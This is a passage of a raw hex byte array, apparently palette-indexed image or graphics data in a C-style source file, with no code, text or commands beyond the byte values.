0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xDF, 0xDF, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0x12, 0x12, 0xC8, 0x12, 0xC9, 0xE1, 0x14, 0x14, 0x14, 0x99, 0x9B, 0x16, 0x9B, 0x9B, 0x08, 0x14,
0xE1, 0x12, 0x11, 0x11, 0x12, 0xE4, 0x9A, 0x9E, 0x9E, 0x08, 0x08, 0x08, 0x08, 0x08, 0x9F, 0x08,
0x14, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12,
0xCF, 0xE6, 0xE6, 0xE6, 0xE6, 0xCE, 0xCF, 0xCF, 0xCF, 0xCF, 0xCE, 0xE7, 0x12, 0x11, 0x12, 0xCF,
0xCE, 0xCE, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0x12,
0x12, 0xCF, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0xE7,
0xE7, 0xCE, 0xCF, 0xCF, 0x12, 0x12, 0xCF, 0xE8, 0xE7, 0xE7, 0xE6, 0xE6, 0xE5, 0xE7, 0x11, 0x11,
0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xDF, 0xAE, 0x19, 0x07,
0x19, 0x19, 0x18, 0xAC, 0xAE, 0xAE, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0xAD, 0xAD,
0x95, 0x95, 0xAD, 0xAC, 0x18, 0x19, 0x18, 0xAC, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94,
0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAD, 0xAE, 0x96, 0x97, 0xDE, 0xDF, 0xDF, 0xDF, 0xDF, 0xDF, 0xDE, 0xF4, 0x96, 0x96,
0x95, 0xAD, 0xAD, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94,
0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0x17, 0x17, 0xAC, 0xAF, 0xF5, 0xDF,
0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12,
0xC8, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0xC8, 0xE2, 0x99, 0x17, 0x17, 0x99, 0xE3, 0xE2, 0x08, 0x17, 0x18, 0x18, 0x99, 0x14,
0xC9, 0x11, 0x11, 0x11, 0xCA, 0x14, 0x16, 0x16, 0x9E, 0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0xE5, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x12, 0x12,
0xCF, 0xCE, 0xCE, 0xCE, 0xCE, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0xCF,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0x12, 0x11, 0x11,
0x11, 0x12, 0x12, 0x12, 0x12, 0x11, 0x12, 0x12, 0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0xAE, 0x19,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x18, 0x17, 0xAE, 0xAF, 0xAF, 0xAE, 0xAE, 0xAE, 0xAE,
0xAE, 0xAE, 0x95, 0x95, 0x95, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94,
0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0x96, 0xDD, 0xDE, 0xDE, 0xDE, 0xDD, 0x97, 0x96, 0xAD, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0x17, 0x18,
0x18, 0x18, 0x19, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x67, 0x67, 0x67, 0x66, 0x1D, 0x1D, 0x07, 0x14,
0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0xC8,
0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x14, 0x16, 0x18, 0x18, 0x18, 0x18, 0x18, 0x07, 0x1B, 0x1B, 0x1B, 0x17, 0x14,
0x12, 0x12, 0x11, 0x12, 0xE2, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0xE4, 0xE5, 0xE5, 0xE5, 0xE6,
0xCE, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCF, 0xCF, 0xCE,
0xCE, 0xCE, 0xE7, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE5, 0xE6, 0xCF, 0x12, 0x12, 0xCE, 0xE5, 0xE5,
0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE2, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13,
0x13, 0x13, 0x13, 0x13, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x98,
0x18, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x18, 0x18, 0x17, 0xAD, 0xAE,
0xAF, 0xAF, 0xAE, 0xAE, 0x95, 0xAD, 0x95, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94,
0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94,
0x94, 0xAC, 0xAC, 0xAC, 0x95, 0xDC, 0xDE, 0xDD, 0xDD, 0xDE, 0xDC, 0x96, 0x95, 0xAD, 0x94, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0x94, 0x94, 0x94, 0x94, 0x94, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0x94, 0x94, 0x94, 0x94, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x07, 0x07, 0x1B, 0x50, 0x67, 0x67, 0x67, 0x66, 0x66,
0x66, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x07, 0xAE, 0xC8,
0x11, 0x11, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0x12, 0x12, 0x11, 0x12, 0x11, 0x11, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12,
0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xE0, 0xE2, 0xE3, 0x14, 0x14, 0x14, 0xAE, 0x17, 0x18, 0x17,
0x14, 0x12, 0x11, 0x12, 0xE2, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE5, 0xE5, 0xE5, 0xE5, 0xE5,
0xE6, 0xE5, 0xE5, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE6, 0x12, 0x12, 0x12, 0x12, 0xE4, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3,
0x13, 0x13, 0xCA, 0xCA, 0xCA, 0xCA, 0xCF, 0x12, 0x12, 0x12, 0x12, 0xCA, 0xCF, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
0x14, 0x18, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07,
0x07, 0x18, 0x17, 0x16, 0xAE, 0xAE, 0xAE, 0xAD, 0xAD, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94,
0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94,
0x94, 0x94, 0xAC, 0x95, 0x96, 0xDE, 0xDF, 0xDE, 0xDE, 0xDD, 0x97, 0x95, 0x95, 0xAD, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0x94, 0x94, 0x94, 0x94, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0x17, 0x18, 0x18, 0x19, 0x19, 0x07, 0x07, 0x1B, 0x1B, 0x67, 0x67, 0x66,
0x66, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1C, 0x1B, 0x1B, 0x07, 0x19, 0x17, 0xF6, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xDF, 0xC8, 0xDF, 0xC8, 0xDF, 0xDF, 0xF6, 0xAE, 0x18, 0x17, 0x16, 0x17, 0x17,
0x16, 0x14, 0xCA, 0xC9, 0xE2, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x9A, 0x9A, 0x08, 0x08, 0xE2, 0x12, 0x12, 0x12, 0xCA, 0x14, 0x9A, 0x9A,
0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,
0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0xE4,
0xCA, 0x12, 0xCA, 0x13, 0xE3, 0xE4, 0x14, 0x14, 0x14, 0xE4, 0x14, 0x14, 0x14, 0xE4, 0xE3, 0xE3,
0xE3, 0xE2, 0xE2, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x14, 0x19, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x19, 0x18, 0x17, 0xAC, 0xAD, 0xAD, 0x94, 0x94, 0x94, 0x94,
0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94,
0x94, 0xAC, 0xAD, 0x96, 0xDD, 0xDE, 0xDF, 0xDE, 0xDD, 0x97, 0x95, 0x95, 0xAD, 0x94, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0x94, 0x94, 0x94, 0x94, 0x94, 0xAC, 0xAC, 0xAC, 0x94, 0x94, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0x18, 0x18, 0x18, 0x19, 0x07, 0x07, 0x07,
0x50, 0x67, 0x67, 0x51, 0x66, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1B, 0x07, 0x07, 0x18, 0x16, 0x14, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC9, 0xC9, 0xC9, 0xC9, 0xC8, 0xC8, 0xC9, 0xC8, 0x98, 0x19, 0x1B, 0x1D, 0x1C,
0x1C, 0x1B, 0x17, 0x14, 0x08, 0x08, 0x9E, 0x9D, 0x9D, 0x9B, 0x9E, 0x9A, 0x08, 0x08, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x9A, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9A, 0x9A, 0x9A,
0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x08, 0x13, 0x12, 0x11, 0x12, 0xE4, 0x99, 0x9A, 0x9A,
0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A,
0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A,
0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x99, 0x99, 0x99, 0x99, 0x99, 0x14, 0xE2,
0x12, 0x12, 0x12, 0xCA, 0xE2, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x11, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x08, 0x19, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x51, 0x50, 0x50, 0x07, 0x19, 0x18, 0xAC, 0xAC,
0xAD, 0xAD, 0xAD, 0xAD, 0xAC, 0xAC, 0xAC, 0xAC, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0xAC, 0xAC,
0xAD, 0xAD, 0x95, 0xDC, 0xDE, 0xDD, 0xDD, 0xDE, 0xDC, 0x96, 0x95, 0xAC, 0xAC, 0xAC, 0x94, 0x94,
0xAC, 0xAC, 0xAC, 0xAC, 0x94, 0x94, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0x17,
0x18, 0x18, 0x19, 0x19, 0x07, 0x1B, 0x50, 0x67, 0x67, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1D, 0x1C, 0x1B, 0x07, 0x19, 0x17, 0x98, 0xC9, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC9, 0xC8, 0xC8, 0xC8, 0xC9, 0xC9, 0xE3, 0x08, 0x17, 0x18,
0x07, 0x1C, 0x1C, 0x07, 0x18, 0x9C, 0x17, 0x9C, 0x9D, 0x9D, 0x9E, 0x9A, 0x08, 0x08, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x9A, 0x9B, 0x9B, 0x9B, 0x9B, 0x9A, 0x9A, 0x9A, 0x9A,
0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x08, 0x14, 0xC9, 0x12, 0x12, 0x12, 0xE4, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x99, 0x99, 0x99, 0x99, 0x99, 0x9A, 0x9A, 0x9A, 0x9A,
0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A,
0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x08, 0xE3, 0x12,
0x12, 0x12, 0x12, 0xE2, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x11, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x12, 0x08, 0x19, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x1B, 0x07,
0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x51, 0x51, 0x51, 0x51, 0x67, 0x67, 0x67, 0x67,
0x50, 0x07, 0x19, 0x18, 0x17, 0xAC, 0xAC, 0xAD, 0xAC, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD,
0xAD, 0x95, 0x96, 0xDE, 0xDD, 0xF5, 0xDD, 0xDE, 0x97, 0x95, 0xAD, 0xAC, 0xAC, 0xAD, 0xAD, 0xAD,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0x18, 0x18, 0x18, 0x19, 0x07, 0x1B, 0x67, 0x67, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D,
0x1D, 0x1C, 0x1B, 0x19, 0x18, 0x16, 0xE3, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0x12, 0xC8, 0xC8, 0xC8, 0xC9, 0xE0, 0xE1, 0xE2, 0x14,
0x08, 0x08, 0x17, 0x19, 0x07, 0x18, 0x17, 0x9C, 0x9B, 0x9A, 0x08, 0x08, 0x08, 0x14, 0xE4, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x9A, 0x9B, 0x9C, 0x9B, 0x9B, 0x9B, 0x9A, 0x9A, 0x08,
0x08, 0x08, 0x14, 0x14, 0xE4, 0xE3, 0xE2, 0x13, 0x13, 0x13, 0xCA, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9,
0xC9, 0xC9, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xE1, 0xE1, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2,
0xE3, 0xE2, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE4, 0xE4, 0xE4, 0x14, 0x14, 0xE4, 0xE3, 0xC9, 0x12,
0x12, 0x12, 0xC9, 0xE3, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x16, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x51, 0x51, 0x51, 0x51, 0x51, 0x51, 0x51,
0x51, 0x51, 0x51, 0x51, 0x51, 0x67, 0x50, 0x50, 0x07, 0x19, 0x18, 0x17, 0xAC, 0xAC, 0xAD, 0xAD,
0xAD, 0x95, 0x97, 0xDE, 0xDE, 0xF6, 0xDE, 0xF5, 0x96, 0xAE, 0xAE, 0xAE, 0xAE, 0xAD, 0xAC, 0x17,
0x18, 0x18, 0x19, 0x07, 0x1B, 0x67, 0x67, 0x66, 0x66, 0x66, 0x66, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1B,
0x07, 0x18, 0x17, 0x14, 0xC9, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC9, 0xC9, 0xC9, 0xE0, 0x14,
0x18, 0x18, 0x16, 0x99, 0x9B, 0x18, 0x18, 0x17, 0x9A, 0x08, 0x08, 0x08, 0x14, 0xE3, 0xCA, 0xCA,
0xE2, 0xE3, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x14, 0xE4, 0xE5, 0xE3, 0xCA, 0x13, 0xE6, 0xE3,
0xE3, 0x13, 0xCA, 0xCA, 0xC9, 0xC9, 0x12, 0x12, 0xCE, 0xE6, 0xE3, 0xE3, 0x13, 0xE2, 0xE3, 0xE2,
0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0x13, 0x13,
0x13, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xC9, 0xC9, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCA, 0xE2, 0xE2, 0xE3, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x08,
0x08, 0x08, 0x08, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x08, 0x18, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
